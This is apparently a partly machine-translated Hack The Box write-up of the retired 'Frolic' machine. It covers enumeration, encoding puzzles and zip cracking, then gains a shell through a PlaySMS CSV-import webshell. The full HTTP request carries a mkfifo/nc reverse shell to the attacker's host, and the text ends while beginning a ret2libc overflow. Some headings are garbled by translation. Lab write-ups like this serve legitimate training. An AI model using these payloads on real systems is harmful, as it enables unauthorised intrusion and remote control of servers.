# 0xdf黑客的东西

[0xdf.gitlab.io](https://0xdf.gitlab.io/2019/03/23/htb-frolic.html)0xdf黑客的东西

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ffrolic-cover.png)嬉戏更像是一连串的挑战和谜题，而不是更典型的HTB体验。枚举将带我完成一系列谜题，这些谜题最终会将凭据解锁到 PlaySMS 网页界面。通过该访问权限，我可以利用该服务来获得执行和shell。为了获得根，我会找到一个由根拥有的 setuid 二进制文件，并用简单的 ret2libc 攻击溢出它。在《超越根》中，我将使用PlaySMS漏洞的元升级版本并反转其有效负载。我还将浏览盒子上两个用户的Bash历史文件，看看作者是如何构建盒子的。

## 箱子信息

名字

[嬉戏](https://www.hackthebox.eu/home/machines/profile/158) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-frolic.png) 

发行日期

[13 10月 2018](https://twitter.com/hackthebox_eu/status/1050007869519798272)

停用日期

16 3月 2019

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ffrolic-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ffrolic-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 17分17秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F22587)](https://www.hackthebox.eu/home/users/profile/22587)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 21分钟 18秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F2571)](https://www.hackthebox.eu/home/users/profile/2571)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F27390)](https://www.hackthebox.eu/home/users/profile/27390)-

## 侦察

### n地图

`nmap`显示了在两个奇数端口（TCP 1880 和 9999）上运行 SMB （TCP 445/139）、固态混合网络 （TCP 22） 和 HTTP 的 Linux 主机：

    root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.111
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 18:59 EDT
    Nmap scan report for 10.10.10.111
    Host is up (0.021s latency).
    Not shown: 65530 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    1880/tcp open  vsat-control
    9999/tcp open  abyss
    
    Nmap done: 1 IP address (1 host up) scanned in 10.30 seconds
    root@kali# nmap -sC -sV -p 22,139,445,1880,9999 -oA nmap/scripts 10.10.10.111
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 19:00 EDT
    Nmap scan report for 10.10.10.111
    Host is up (0.020s latency).
    
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
    |   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
    |_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    1880/tcp open  http        Node.js (Express middleware)
    |_http-title: Node-RED
    9999/tcp open  http        nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    |_http-title: Welcome to nginx!
    Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Host script results:
    |_clock-skew: mean: -1h55m39s, deviation: 3h10m31s, median: -5m39s
    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery:
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: frolic
    |   NetBIOS computer name: FROLIC\x00
    |   Domain name: \x00
    |   FQDN: frolic
    |_  System time: 2018-10-30T04:25:32+05:30
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2018-10-29 18:55:32
    |_  start_date: N/A
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
    

### 中小型企业 - TCP 445

`smbmap`两者都显示任何有趣的东西，两个共享，没有匿名访问：`smbclient`

    root@kali# smbmap -H 10.10.10.111
    [+] Finding open SMB ports....                       
    [+] Guest SMB session established on 10.10.10.111...                                           
    [+] IP: 10.10.10.111:445        Name: 10.10.10.111   
            Disk                                                    Permissions
            ----                                                    -----------    
            print$                                                  NO ACCESS
            IPC$                                                    NO ACCESS
    
    root@kali# smbclient -N -L //10.10.10.111
    
            Sharename       Type      Comment            
            ---------       ----      -------
            print$          Disk      Printer Drivers
            IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
    Reconnecting with SMB1 for workgroup listing.                                        
    
            Server               Comment                                   
            ---------            -------                                                 
    
            Workgroup            Master                                   
            ---------            -------                             
            WORKGROUP            FROLIC    
    

### 节点红色 - TCP 1880

在1880年看到Node-Red会唤起人们对[Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html)的记忆，但在这种情况下，访问需要登录：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1552487382483.png)

在尝试了一些基本的信誉之后，我会继续。

### 网站 - TCP 9999

#### 网站

根页面是一个nginx欢迎页面：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540861834781.png)

#### 戈克斯特

`gobuster`挖掘出几条有趣的路径：

    root@kali# gobuster -u http://10.10.10.111:9999 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,js,php -t 30
    
    =====================================================                      
    Gobuster v2.0.0              OJ Reeves (@TheColonial)                         
    =====================================================                     
    [+] Mode         : dir                                                           
    [+] Url/Domain   : http://10.10.10.111:9999/                                           
    [+] Threads      : 30                                                              
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307,403                                         
    [+] Extensions   : txt,js,php                                                        
    [+] Timeout      : 10s                                                      
    =====================================================
    2018/10/29 19:03:16 Starting gobuster
    =====================================================
    /admin (Status: 301)
    /test (Status: 301)
    /dev (Status: 301)
    /backup (Status: 301)
    /loop (Status: 301)
    =====================================================
    2018/10/29 19:17:14 Finished
    =====================================================
    

#### /测试

`/test`提供输出：`phpinfo()`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1552488602943.png)

#### /备份

这个页面有点像目录列表，但只是文本：

    root@kali# curl 10.10.10.111:9999/backup/
    password.txt
    user.txt
    loop/
    

今后，我会牢记这些：

    root@kali# curl 10.10.10.111:9999/backup/user.txt
    user - admin
    root@kali# curl 10.10.10.111:9999/backup/password.txt
    password - imnothuman
    

`/loop/`返回 403 禁止访问。

#### /开发

`/dev`返回 403 Forbidden，但该路径上的 a 提供了更多可供探索的路径：`gobuster`

    root@kali# gobuster -u http://10.10.10.111:9999/dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,html,php -t 40
    
    =====================================================
    Gobuster v2.0.0              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.111:9999/dev/
    [+] Threads      : 40
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Extensions   : txt,html,php
    [+] Timeout      : 10s
    =====================================================
    2018/10/29 22:02:19 Starting gobuster
    =====================================================
    /test (Status: 200)
    /backup (Status: 301)
    =====================================================
    2018/10/29 22:06:48 Finished
    =====================================================
    

`/test` is a 5 byte file, “test\\n”.

`/dev/backup` returns text indicating another path:

    root@kali# curl 10.10.10.111:9999/dev/backup/
    /playsms
    

#### /playsms

I now have another login panel, this time for the PlaySMS application:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540897170290.png)

#### /admin

This page presents a “hackable” login page:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540861933006.png)

## Puzzles

The next few steps in this box are more of a series of CTF challenges than a machine to hack. I’ll work through them to find a password.

### /admin Login

Since the login page advertises that it’s hackable, I’ll start there. Looking at the page source, I see :`/admin``login.js`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540862256665.png)

Opening that up reveals not only the password, but that it’s not event necessary:

    var attempt = 3; // Variable to count number of attempts.
    // Below function Executes on click of login button.
    function validate(){
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    if ( username == "admin" && password == "superduperlooperpassword_lol"){
    alert ("Login successfully");
    window.location = "success.html"; // Redirecting to other page.
    return false;
    }
    else{
    attempt --;// Decrementing by one.
    alert("You have left "+attempt+" attempt;");
    // Disabling fields after 3 attempts.
    if( attempt == 0){
    document.getElementById("username").disabled = true;
    document.getElementById("password").disabled = true;
    document.getElementById("submit").disabled = true;
    return false;
    }
    }
    }
    

I can enter “admin” / “superduperlooperpassword\_lol”, or just visit .`http://10.10.10.111:9999/admin/success.html`

### /success.html

This page presents a bunch of .s, !s, and ?s:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540862344998.png)

This is actually an esoteric programming language called [Ook!](https://esolangs.org/wiki/ook!). It’s a version of BrainFuck. Ook! has three symbols, “Ook.”, “Ook!”, and “Ook?”. To convert this to true Ook!, I’ll need to add the “Ook” string.

I wrote a quick python script to do that:

    #!/usr/bin/python3
    
    import sys
    
    if len(sys.argv) != 3:
        print(f"{sys.argv[0]} [infile] [outfile]")
        sys.exit(0)
    
    try:
        with open(sys.argv[1], 'r') as f:
            with open(sys.argv[2], 'w') as fout:
                fout.write(f.read().replace('.', 'Ook. ').replace('?','Ook? ').replace('!','Ook! '))
    except:
        print("Failed")
    

我将使用 bash 表示法来运行命令，并将输出视为文件：`<( )`

    root@kali# curl -s http://10.10.10.111:9999/admin/success.html | tr -d ' ' | tr -d '\n'
    ................!?!!.?................?.?!.?............................!.?...........!?!!.?..........?.?!.?................!...........!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...!...........!.!!!!!!!!!!!!!!!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?.................!?!!.?................?.?!.?................!.!!!!!!!.?.......!?!!.?......?.?!.?........!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!.?.................!?!!.?................?.?!.?......!...........!.!!!!!!!.!!!!!.................!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!.?.......!?!!.?......?.?!.?............!.?...............!?!!.?..............?.?!.?..!.?.........!?!!.?........?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!!!...........!.?.........!?!!.?!!!!!!!!?.?!.?!!!!!!!!!!!!!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!!!!!...................!.!.?...........!?!!.?!!!!!!!!!!?.?!.?!!!.?...........!?!!.?..........?.?!.?................!.............!.?.........!?!!.?!!!!!!!!?.?!.?!!!!!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!.?.........!?!!.?........?.?!.?..!.!!!!!!!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?....!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!.!!!!!!!.......!.!!!!!!!.?.
    
    root@kali:~/hackth./string2ook.py <( curl -s http://10.10.10.111:9999/admin/success.html | tr -d ' ' | tr -d '\n') success.ook
    
    root@kali# head -c 80 success.ook 
    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
    

我得到了这个Ook！来自github的解释器调用[了pooky](https://github.com/umbrant/pooky)，并用它来运行文件：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540862790059.png)

或者，dcode.fr 有一个Ook！口译员将像我一样接受输入，而无需翻译：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1552489299187.png)

### /asdiSIAJJ0QWE9JAS

在 处，有更多编码文本：`http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/`

    root@kali# curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
    UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
    BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
    K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
    EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
    lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
    AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
    AAAAAAEAAQBPAAAAAwEAAAAA
    

当我解码它时，我认识到PK魔术数字是一个zip文件：

    root@kali# curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd
    00000000: 504b 0304 1400 0900 0800 c389 374d 23fe  PK..........7M#.
    00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e  [.....i.......in
    00000020: 6465 782e 7068 7055 5409 0003 857c a75b  dex.phpUT....|.[
    00000030: 857c a75b 7578 0b00 0104 0000 0000 0400  .|.[ux..........
    00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b  ...^D..J.s.h.)..
    00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc  .P.n...Ss..Jw...
    00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8  ...4....k.z...U.
    00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea  ..+X...P........
    00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea  ...x_..N.[...S..
    00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0  8......J2S.*..D.
    000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4  .}.8dT.Q.k......
    000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2  .j_.......'x.c..
    000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95  ...t..75Q.......
    000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609  .k.,4..b).4F....
    000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4  .........&q2o.W.
    000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069  ..9PK..#.[.....i
    00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3  ...PK...........
    00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009  .7M#.[.....i....
    00000120: 0018 0000 0000 0001 0000 00a4 8100 0000  ................
    00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385  .index.phpUT....
    00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000  |.[ux...........
    00000150: 0000 504b 0506 0000 0000 0100 0100 4f00  ..PK..........O.
    00000160: 0000 0301 0000 0000                      ........
    

我可以将其保存到文件中，并使用命令进行验证：`file`

    root@kali# curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > index.php.zip
    
    root@kali# file index.php.zip 
    out.zip: Zip archive data, at least v2.0 to extract
    

解压缩提示输入密码：

    root@kali# unzip out.zip 
    Archive:  out.zip
    [out.zip] index.php password:
    

我将用以下命令暴力破解它：`fcrackzip`

    root@kali# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt out.zip                                                                                                        
    
    
    PASSWORD FOUND!!!!: pw == password
    

选项是强制实际解压缩，这将清除大量的fps，用于字典，并传递单词列表。现在我可以解压缩并得到.`-u``-D``-p rockyou.txt``index.php`

### 索引.php

`index.php`包含 ascii 范围内的十六进制字节：

    root@kali# cat index.php 
    4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
    

用于将其读回字节，这恰好不仅是 ASCII，而且是 base64 字符：`xxd`

    root@kali# cat index.php | xxd -r -p
    KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
    KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
    K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
    LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
    

那里有一些会搞砸base64。我将删除它们，并解码：`\r\n`

    root@kali# cat index.php | xxd -r -p | tr -d '\r\n' | base64 -d
    +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
    ++..< 
    

这是[脑筋急转弯](https://en.wikipedia.org/wiki/Brainfuck)。将其放入[在线解释器](https://copy.sh/brainfuck/)中，它会输出“idkwhatispass”。

## 壳牌作为万维数据

### 认证

现在我有了密码，我将在节点还原和播放短信中尝试一下。“管理员”/“用户名”适用于“游戏”页面：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540897208940.png)

### 概念验证

游戏中存在一个[公共漏洞](https://www.exploit-db.com/exploits/42044/)。

我将创建后门.csv如漏洞利用数据库中所述：

    root@kali# cat backdoor.csv 
    Name,Mobile,Email,Group code,Tags
    <?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,
    

然后，我将转到“我的帐户”菜单并选择“电话簿”。有一个“导入”按钮（用红色圈出）：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540897926580.png)

点击导入按钮将我带到一个表单，我可以在其中上传csv。我需要使用用户代理更改程序，或者在burp中捕获请求并将其更改为要运行的命令。如果我将我的用户代理设置为 ，我得到这个：`id`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540898069120.png)

执行！我可以自己打电话吗？将用户代理更改为，我在 ：`ping -c 1 10.10.14.5``tcpdump`

    root@kali# tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    07:09:33.063546 IP 10.10.10.111 > kali: ICMP echo request, id 23468, seq 1, length 64
    07:09:33.063575 IP kali > 10.10.10.111: ICMP echo reply, id 23468, seq 1, length 64
    

结果也会显示在页面上：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1540898131564.png)

### 壳

要获得shell，只需再次上传，并附上这篇文章：

    POST /playsms/index.php?app=main&inc=feature_phonebook&route=import&op=import HTTP/1.1
    Host: 10.10.10.111:9999
    User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
    Content-Type: multipart/form-data; boundary=---------------------------108439560411129991651388232098
    Content-Length: 464
    Cookie: PHPSESSID=ptceco91sdoqcslk7i4g1qcqa4
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    -----------------------------108439560411129991651388232098
    Content-Disposition: form-data; name="X-CSRF-Token"
    
    5815349d051a532d70dd324ee3cf696a
    -----------------------------108439560411129991651388232098
    Content-Disposition: form-data; name="fnpb"; filename="backdoor.csv"
    Content-Type: text/csv
    
    Name,Mobile,Email,Group code,Tags
    <?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,
    
    -----------------------------108439560411129991651388232098--
    

这又回到了外壳：

    root@kali# nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.5] from (UNKNOWN) [10.10.10.111] 47520
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

从那里我可以抓住：`user.txt`

    www-data@frolic:/home/ayush$ cat user.txt 
    2ab95909...
    

## Privesc： www-data –> 根

### 列举

在 中有一个由 root 拥有的二进制文件：`/home/ayush/.binary`

    www-data@frolic:/home/ayush/.binary$ ls -l
    total 8
    -rwsr-xr-x 1 root root 7480 Sep 25 00:59 rop
    

由于这看起来像是一个利用机会，我将看到配置的内容。无反洗钱率：

    www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
    0
    

当我拉回二进制文件时，使用[PEDA](https://github.com/longld/peda)打开它，然后运行：`gdb``checksec`

    gdb-peda$ checksec 
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : Partial
    

我也可以运行它，并强制它崩溃：

    root@kali# ./rop 
    [*] Usage: program <message>
    
    root@kali# ./rop $(python -c 'print "A"*10')
    [+] Message sent: AAAAAAAAAA
    
    root@kali# ./rop $(python -c 'print "A"*500')
    Segmentation fault
    

### 背景

#### 策略

我可能会通过发送太多输入来导致程序崩溃，这可能意味着我可以在某个地方覆盖返回地址。假设 ASLR 已禁用但启用了 DEP （NX），则最简单的攻击路径是使用“返回到 libc”。

#### 堆栈

为了理解返回到 libc，了解堆栈的工作原理非常重要。堆栈是进程中的内存，用于存储函数变量、参数和其他数据。堆栈的工作方式允许一个函数调用另一个函数，知道该函数可以调用任意数量的函数。每次函数返回时，它都能够将状态放回调用函数的预期状态。

堆栈从高内存地址开始，并构建到较低的内存地址。在任何给定的函数中，都有一个堆栈帧。堆栈帧的底部存储在 RBP（或 x86 上的 EBP）寄存器中。顶部存储在 RSP（或 ESP）中。例如（我将在此示例中使用 32 位寄存器，因为 Frolic 是 32 位）：

                +-------------+
    0xffffd100  |             |  <-- ESP
                +-------------+
                |             |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |  <-- EBP
                +-------------+
    

两个指针之间的空格由函数用于变量等。

#### 函数调用

调用函数时，参数被放到堆栈上（通过在顶部添加空间或使用已经存在的空间）。因此，例如，该程序将涉及：

    mov    DWORD PTR [esp+0x4],eax   // copy the value in EAX to the address esp+4
    lea    eax,[esp+0x1c]            // copy the value at esp+0x1c to EAX
    mov    DWORD PTR [esp],eax       // copy EAX to the value at ESP
    call   0x8048340 <strcpy@plt>    // call strcpy
    

在呼叫之前，两个地址存储在 ESP 和 ESP+4 中。这些是要复制的字符串的地址和要将其复制到的缓冲区：

                +-------------+
    0xffffd100  |   copy to   |  <-- ESP
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |  <-- EBP
                +-------------+
    

现在到达指令。它将把下一条指令推送到堆栈的顶部（作为返回地址），然后跳转到新函数。下一个函数将从一些常见的东西开始，称为序幕：`call`

    push   ebp          // push ebp on to the stack
    mov    ebp, esp     // copy esp to ebp
    sub    esp, 0x100   // subtract 0x100 from esp, creating a new frame
    

因此，请一步一步来。 推送返回地址：`call`

                +-------------+
                |             |
                +-------------+
                |   ret addr  |  <-- ESP
                +-------------+
    0xffffd100  |   copy to   |
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |  <-- EBP
                +-------------+
    

现在：`push ebp`

                +-------------+
                |  0xffffd188 |  <-- ESP
                +-------------+
                |   ret addr  |
                +-------------+
    0xffffd100  |   copy to   |
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |  <-- EBP
                +-------------+
    

`mov ebp, esp`:

                +-------------+
                |  0xffffd188 |  <-- ESP, EBP
                +-------------+
                |   ret addr  |
                +-------------+
    0xffffd100  |   copy to   |
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |
                +-------------+
    

最后：`sub esp, 0x100`

                +-------------+
    0xffffcef8  |             |  <-- ESP
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
                |             |
                +-------------+
    0xffffcff8  |  0xffffd188 |  <-- EBP
                +-------------+
                |   ret addr  |
                +-------------+
    0xffffd100  |   copy to   |
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |
                +-------------+
    

#### 堆栈返回

当一个函数完成时，它通常以：

    leave
    ret
    

`leave` == `mov esp, ebp` + `pop ebp`.

So the stack from before becomes:

                +-------------+
                |  0xffffd188 |  <-- EBP still there, but no longer used
                +-------------+
                |   ret addr  |  <-- ESP
                +-------------+ 
    0xffffd100  |   copy to   |
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |  <-- EBP
                +-------------+ 
    

Then when the return happens, the instruction pointer is popped, bringing that stack back to where it started:

                +-------------+
                |  0xffffd188 |
                +-------------+
                |   ret addr  |
                +-------------+   
    0xffffd100  |   copy to   |  <-- ESP
                +-------------+
                |  copy from  |
                +-------------+
                |             |
                +-------------+
                      ...
                +-------------+
                |             |
                +-------------+
    0xffffd188  |             |  <-- EBP
                +-------------+
    

#### What Is Return to libc

A return to libc attack involves overwriting the return address in such a way that the computer jumps to the function I want. The standard case is the function, with the argument , giving me a shell.`system``/bin/sh`

If I were to normally, I would enter the function after the but before the prologue with a stack like this:`call system("/bin/sh")``call`

                +-------------+
                |   ret addr  |  <-- ESP
                +-------------+
                |  "/bin/sh"  |
                +-------------+
                |             |
                +-------------+
                      ...
                                 <-- EBP
    

The return address would be pushed onto the stack by the instruction. But I’m not going to be going to via a , but rather a . So, I want the stack to look like this when I reach the return:`call``system``call``ret`

                +-------------+
                | system addr |  <-- ESP
                +-------------+
                |   ret addr  |
                +-------------+
                |  "/bin/sh"  |
                +-------------+
                |             |
                +-------------+
                      ...
                                 <-- EBP
    

That way, will pop the system address into the instruction pointer, and the stack will look right. Since I don’t know the right return address, I’ll just use the function exit, so it cleanly exits when I’m done.`ret`

### Find the Offset to EIP

It’s helpful to get an idea of how big a buffer I’m going to overflow. Does 200 byte crash it? Yes. What about 100? Yup.

    www-data@frolic:/home/ayush/.binary$ ./rop $(python3 -c 'print("A" * 200, end="")')
    Segmentation fault (core dumped)
    
    www-data@frolic:/home/ayush/.binary$ ./rop $(python3 -c 'print("A" * 100, end="")')
    Segmentation fault (core dumped)
    

I’ll open the file with . I have configured to automatically load [PEDA](https://github.com/longld/peda). I’ll use one of the functions that PEDA provides, pattern create, to generate a non-repeating string. Then I’ll run the program with that string as input:`gdb``gdb`

    gdb-peda$ pattern create 100
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
    
